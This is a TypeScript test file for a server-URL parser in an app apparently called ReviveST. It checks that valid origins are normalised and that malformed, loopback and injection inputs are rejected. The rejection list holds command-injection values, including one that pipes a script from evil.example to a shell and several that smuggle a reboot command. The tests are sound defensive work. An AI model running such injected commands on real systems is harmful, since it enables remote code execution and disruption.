import { describe, expect, it } from "vite-plus/test";

import {
  DEFAULT_SERVER_URL,
  isSafeServerUrl,
  parseServerUrl,
} from "./server-url";

const parsed = (input: string) => {
  const result = parseServerUrl(input);
  return result.isOk() ? result.value : undefined;
};

describe("parseServerUrl", () => {
  it.each([
    [DEFAULT_SERVER_URL, DEFAULT_SERVER_URL],
    ["https://api.revivest.app/", DEFAULT_SERVER_URL],
    ["HTTPS://API.ReviveST.app", DEFAULT_SERVER_URL],
    ["https://api.revivest.app:443", DEFAULT_SERVER_URL],
    ["http://revive.example.com:80/", "http://revive.example.com"],
    ["http://revive.example.com:443", "http://revive.example.com:443"],
    ["https://revive.example.com:80", "https://revive.example.com:80"],
    ["http://nas:3000", "http://nas:3000"],
    ["http://my-nas.local:3000/", "http://my-nas.local:3000"],
    ["http://192.168.1.10:3000", "http://192.168.1.10:3000"],
    ["http://10.0.0.1", "http://10.0.0.1"],
    ["http://[fd00::10]:3000", "http://[fd00::10]:3000"],
    ["http://[FD00:0:0:0:0:0:0:10]", "http://[fd00:0:0:0:0:0:0:10]"],
    ["http://[::]:8080", "http://[::]:8080"],
    ["http://revive.example.com:1", "http://revive.example.com:1"],
    ["http://revive.example.com:65535", "http://revive.example.com:65535"],
  ])("accepts %j as %s", (input, origin) => {
    expect(parsed(input)).toBe(origin);
  });

  it.each([
    // Shell and telnet command injection
    "http://a.example;sys reboot",
    'http://";curl evil.example|sh"',
    "http://a.example|sh",
    "http://a.example&&reboot",
    "http://$(reboot).example",
    "http://`reboot`.example",
    "http://a.example$IFS",
    "http://a'.example",
    'http://a".example',
    "http://a.example\nsys reboot",
    "http://a.example\r",
    "http://a.example\t",
    "http://a .example",
    " http://a.example",
    "http://a.example ",
    "http://a.example:3000 reboot",
    "http://<a>.example",
    "http://a\\b.example",
    "http://a_b.example",
    "http://a%20b.example",
    "http://ü.example",
    // Not an origin
    "http://a.example/marge",
    "http://a.example//",
    "http://a.example/?",
    "http://a.example?x=1",
    "http://a.example#top",
    "http://a.example/#",
    "http://user:pass@a.example",
    "http://user@a.example",
    "http://a.example@b.example",
    // Malformed
    "",
    "a.example",
    "//a.example",
    "ftp://a.example",
    "file:///etc/passwd",
    "mailto:a@b.example",
    "https:/a.example",
    "http://",
    "http://.example",
    "http://a..example",
    "http://a.example.",
    "http://-a.example",
    "http://a-.example",
    `http://${"a".repeat(64)}.example`,
    // IP addresses only as dotted quads
    "http://1.2.3",
    "http://1.2.3.4.5",
    "http://256.1.1.1",
    "http://192.168.01.1",
    "http://3232235777",
    "http://0x7f.1",
    "http://example.123",
    // IPv6: bracketed, no zone or embedded IPv4
    "http://fd00::10",
    "http://[fd00::10",
    "http://[fd00::10]]",
    "http://[fd00:::10]",
    "http://[fd00::1::2]",
    "http://[1:2:3:4:5:6:7:8:9]",
    "http://[1:2:3:4:5:6:7]",
    "http://[1:2:3:4::5:6:7:8]",
    "http://[12345::1]",
    "http://[fe80::1%25en0]",
    "http://[::ffff:192.168.1.10]",
    "http://[]",
    // Ports
    "http://a.example:",
    "http://a.example:0",
    "http://a.example:65536",
    "http://a.example:99999",
    "http://a.example:080",
    "http://a.example:-1",
    "http://a.example:3000:3000",
    "http://a.example:http",
  ])("rejects %j", (input) => {
    expect(parseServerUrl(input).isErr()).toBe(true);
  });

  it.each([
    "http://localhost",
    "http://LOCALHOST:3000",
    "http://api.localhost",
    "http://127.0.0.1:3000",
    "http://127.1.2.3",
    "http://[::1]:3000",
    "http://[0:0:0:0:0:0:0:1]",
    "http://[::ffff:7f00:1]",
  ])("rejects the loopback address %j", (input) => {
    const result = parseServerUrl(input);
    expect(result.isErr() && result.error).toMatch(/localhost/);
  });
});

describe("isSafeServerUrl", () => {
  it.each([
    DEFAULT_SERVER_URL,
    "http://192.168.1.10:3000",
    "http://[fd00::10]",
  ])("accepts the origin %s", (url) => {
    expect(isSafeServerUrl(url)).toBe(true);
  });

  it.each([
    `${DEFAULT_SERVER_URL}/`,
    "HTTPS://api.revivest.app",
    "https://api.revivest.app:443",
    "http://a.example;reboot",
    "http://localhost:3000",
    "",
  ])("rejects %j, not a normalised origin", (url) => {
    expect(isSafeServerUrl(url)).toBe(false);
  });
});
